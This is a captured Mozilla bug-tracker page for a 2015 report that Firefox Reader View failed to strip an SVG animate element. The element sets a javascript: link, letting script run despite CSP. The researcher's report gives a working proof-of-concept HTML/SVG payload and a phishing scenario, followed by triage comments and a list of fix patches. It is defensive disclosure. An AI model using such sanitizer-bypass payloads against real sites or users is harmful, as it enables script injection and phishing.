          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8632450">A page to load in Reader View. it contains an SVG that executes script but doesn't get stripped.</a>
        </div>
        <div>
            <a href="#c1" class="attach-time activity-ref"><span class="rel-time" title="2015-07-11 06:49 PDT" data-time="1436622559">6 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_278852" ><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div></span>
        </div>
        <div class="attach-info">2.08 KB,
          text/html        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8632450&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8635260">Patch for redirect issue</a>
        </div>
        <div>
            <a href="#c25" class="attach-time activity-ref"><span class="rel-time" title="2015-07-17 05:33 PDT" data-time="1437136393">6 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">4.69 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_346894" ><span class="fn">Margaret</span>
</div>:
              <a href="#c29"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1437161374"
            >
              feedback+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_20209" ><span class="fn">bzbarsky</span>
</div>:
              <a href="#c31"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1437520850"
            >
              feedback+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8635260&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8635260&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8635260">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8643563">Patch for redirect issue with pref for logging</a>
        </div>
        <div>
            <a href="#c34" class="attach-time activity-ref"><span class="rel-time" title="2015-08-05 02:11 PDT" data-time="1438765916">6 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">7.17 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_159069" ><span class="fn">Gijs</span>
</div>:
              <a href="#c34"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1438765916"
            >
              feedback+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8643563&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8643563&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8643563">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8643570">Patch v3</a>
        </div>
        <div>
            <a href="#c36" class="attach-time activity-ref"><span class="rel-time" title="2015-08-05 02:25 PDT" data-time="1438766733">6 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">7.37 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_346894" ><span class="fn">Margaret</span>
</div>:
              <a href="#c37"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1438766733"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_159069" ><span class="fn">Gijs</span>
</div>:
              <a href="#c36"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1438766733"
            >
              feedback+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_495955" ><span class="fn">Sylvestre</span>
</div>:
              <a href="#a5597001_495955"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1442079366"
            >
              approval-mozilla-aurora+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_538805" ><span class="fn">ritu</span>
</div>:
              <a href="#c60"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1442079366"
            >
              approval-mozilla-beta-</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_538805" ><span class="fn">ritu</span>
</div>:
              <a href="#c64"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1442943921"
            >
              approval-mozilla-release-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8643570&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8643570&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8643570">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8658707">Fix nsTreeSanitizer</a>
        </div>
        <div>
            <a href="#c47" class="attach-time activity-ref"><span class="rel-time" title="2015-09-09 06:22 PDT" data-time="1441804969">6 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.93 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_20209" ><span class="fn">bzbarsky</span>
</div>:
              <a href="#c49"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1441805010"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_495955" ><span class="fn">Sylvestre</span>
</div>:
              <a href="#c56"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1442079152"
            >
              approval-mozilla-aurora+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_538805" ><span class="fn">ritu</span>
</div>:
              <a href="#c61"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1442079152"
            >
              approval-mozilla-beta-</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_495955" ><span class="fn">Sylvestre</span>
</div>:
              <a href="#c56"
                  class="flag-name-status rel-time-title activity-ref"
                  title="6 years ago"
              data-time="1442079152"
            >
              approval-mozilla-esr38-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8658707&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8658707&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1182778&attachment=8658707">Splinter Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="jJC7IZ8ZYHa56A3PoCPzXoV7B9QB1K5Flo92Ga5B1LmLy99g">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="10482940" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" ><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" ><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 06:47 PDT" data-time="1436622474">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-0" data-comment-id="10482940">User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Build ID: 20150629114848

Steps to reproduce:

Firefox offers a special mode for websites supposedly containing articles and text-heavy content that is called the &quot;Reader View&quot; (RV). This RV mode removes any potentially disturbing content from a website and attempts to show only the relevant details such as article headlines, article images and article body.

RV removes the ability to execute scripts (similarly to the RV offered by MS's Edge Browser). It does so by imposing a white-list on HTML content and stripping all that is not considered harmless. this includes script elements, JavaScript URIs, event handlers and more. 

The RV is being deployed from a special scope, about:reader. A URL of a website opened in RV will be &quot;about:reader?url=`escape(%website-url%)`&quot;. While the URL is deployed from the about:reader scheme, the address bar hides that scheme prefix and shows the original page URL.

My tests have shown, that this white-list is too permissive and allows for elements to pass, even though they can execute JavaScript. Here is the full test case I was using (PHP file - for CSP headers' sake):

&lt;?php
header('Content-Security-Policy: default-src \'self\' ');
?&gt;&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Some Article&lt;/h1&gt;
&lt;article&gt;
&lt;h2&gt;Some headline&lt;/h2&gt;
&lt;p&gt;
	&lt;svg xmlns:xlink=&quot;<a rel="nofollow" href="http://www.w3.org/1999/xlink">http://www.w3.org/1999/xlink</a>&quot;&gt;
		&lt;a xlink:href&gt;
			&lt;circle r=&quot;999&quot;&gt;&lt;/circle&gt;
			&lt;animate attributeName=&quot;xlink:href&quot; from=&quot;javascript:alert(location)&quot; to&gt;&lt;/animate&gt;
		&lt;/a&gt;
	&lt;/svg&gt;
	Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?
&lt;/p&gt;
&lt;p&gt;
	Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?
&lt;/p&gt;
&lt;/article&gt;
&lt;/body&gt;
&lt;/html&gt;

Once we load this URL from any web-origin, let's say <a rel="nofollow" href="http://example.com/test.php">http://example.com/test.php</a>, the Firefox browser will show a small icon in the address bar, allowing a user to change into the RV. Once the RV is loaded, the page is shown with the customized minimal markup. 

Now, the interesting part is, that a certain dangerous part of the HTML from our test case above is not being removed:

&lt;svg xmlns:xlink=&quot;<a rel="nofollow" href="http://www.w3.org/1999/xlink">http://www.w3.org/1999/xlink</a>&quot;&gt;
	&lt;a xlink:href&gt;
		&lt;circle r=&quot;999&quot;&gt;&lt;/circle&gt;
		&lt;animate attributeName=&quot;xlink:href&quot; from=&quot;javascript:alert(location)&quot; to&gt;&lt;/animate&gt;
	&lt;/a&gt;
&lt;/svg&gt;

What is shown with this test-case is a large black box (a clip of the SVG circle). Clicking this box will trigger an alert window, executing from about:reader. 

Note that this happens despite CSP headers being used on the original page. 

Further note that for example NoScript needs to white-list about:reader for the RV to be used at all. Once that is the case, NoScript does not prevent the script execution any much longer. This is not optimal and might require changes in both FF and NoScript to function as expected (e.g. allowing NoScript to apply the domain-trust to pages even when loaded in RV). 

I was thinking about possible exploitation of this  seemingly unwanted behaviour. And I think it can be exploited. let's assume the following scenario:

 * An attacker injects the malicious SVG on a website
 * The website uses CSP, users of modern browsers are not affected by the injection
 * A user now decides to use RV and watches the injected page
 * All of a sudden, the payload does work despite CSP
 * Naturally, we have no true XSS here but the attacker can still do a lot
  &gt; Use document.write to eliminate all UI elements of RV
  &gt; Fill the page with arbitrary other content, like a forged login form / other phishing frenzy

The core problem here is, that, even though the page in RV is deployed from about:reader, the user cannot distinguish between RV being active or not. The attacker can influence the entirety of HTML and write whatever into the page body, while the address bar is still showing the original URL without the about:reader prefix. Despite the domain using CSP, the attacker can phish with JavaScript and exfiltrate any data the user emits. And NoScript doesn't seem to help here.

To fix the issue, I'd recommend several things:

 * Fix the white-list and eliminate SVG's animate and set
 * Provide a better domain-based distinction for NoScript to work as expected
 * Optimize the info shown in the address bar to avoid spoofing attacks
 * Don't lose security headers on the way. CSP in regular mode should also work in RV


Actual results:

see above


Expected results:

see above</pre></div><div class="change-set" id="c1"><div class="comment" data-id="10482942" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" ><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" ><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 06:49 PDT" data-time="1436622559">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8632450"
         class="attachment"
         data-id="8632450" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="test2.php">
      <meta itemprop="contentSize" content="2128">
      <meta itemprop="encodingFormat" content="text/html">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8632450" itemprop="contentUrl">
        <span id="att-8632450-description" itemprop="description">A page to load in Reader View. it contains an SVG that executes script but doesn't get stripped.</span></a>
        — <a href="attachment.cgi?id=8632450&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="a186_278852"><div class="change" id="aa186_278852">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a186_278852"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_278852" id="a186_278852"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a186_278852"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a186_278852">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a186_278852">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 06:51 PDT" data-time="1436622660">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">OS: Unspecified &rarr; All</div><div class="change">Hardware: Unspecified &rarr; All</div></div></div><div class="change-set" id="a208_428608"><div class="change" id="aa208_428608">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a208_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_428608" id="a208_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a208_428608"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a208_428608">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a208_428608">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 06:51 PDT" data-time="1436622682">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Duplicate of this bug: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - Reader Mode does not completely disable all active content (XSS)"
   href="/show_bug.cgi?id=1136692">1136692</a></div></div></div><div class="change-set" id="c3"><div class="comment" data-id="10482949" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a208_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a208_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 06:57 PDT" data-time="1436623060">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-3" data-comment-id="10482949">I'm not super fussed about the spoofing risk. The awesome bar still shows the URL of the page that is trying to attack reader mode.

I'd call this sec-low (moderate at most), unless you can do something more than you could do with content.</pre><div class="activity"><div class="change">Status: UNCONFIRMED &rarr; NEW</div><div class="change">Ever confirmed: true</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=wsec-xss&amp;resolution=---">wsec-xss</a></div></div></div><div class="change-set" id="c4"><div class="comment" data-id="10482950" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a208_428608"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a208_428608"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 06:59 PDT" data-time="1436623166">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-4" data-comment-id="10482950">&#64;Giorgio I tested with NoScript 2.6.9.30 with settings being reset. After permitting RV in general, the script executed on click. There's no domain based protection for pages shown in RV.</pre></div><div class="change-set" id="c5"><div class="comment" data-id="10482952" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a208_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a208_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 07:01 PDT" data-time="1436623285">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-5" data-comment-id="10482952">I misread the spoofing risk. I understand that your scenario assumes XSS on a page that has CSP and reader mode provides a CSP bypass here.</pre></div><div class="change-set" id="c6"><div class="comment" data-id="10482953" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278852" id="a208_428608"><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278852" id="a208_428608"><a class="email " href="/user_profile?user_id=278852" > <span class="fna">Mario Heiderich</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 07:10 PDT" data-time="1436623849">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-6" data-comment-id="10482953">(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c5">comment #5</a>)
<span class="quote">&gt; I misread the spoofing risk. I understand that your scenario assumes XSS on
&gt; a page that has CSP and reader mode provides a CSP bypass here.</span >

Yep, the core problem here is that security headers are not respected. Neither would CSP work, nor would NoScript in the current version have a realistic chance to stop the injected script from executing.</pre></div><div class="change-set" id="a2428_159069"><div class="change" id="aa2428_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a2428_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a2428_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2428_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2428_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a2428_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-07-11 07:28 PDT" data-time="1436624902">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(fbraun)</div></div></div><div class="change-set" id="c8"><div class="comment" data-id="10483491" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_218550" id="a2428_159069"><img src="https://secure.gravatar.com/avatar/c5d912dac5c74b47bbaff7164f5f8bb8?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_218550" id="a2428_159069"><a class="email " href="/user_profile?user_id=218550" > <span class="fna">Robert Longson [:longsonr]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
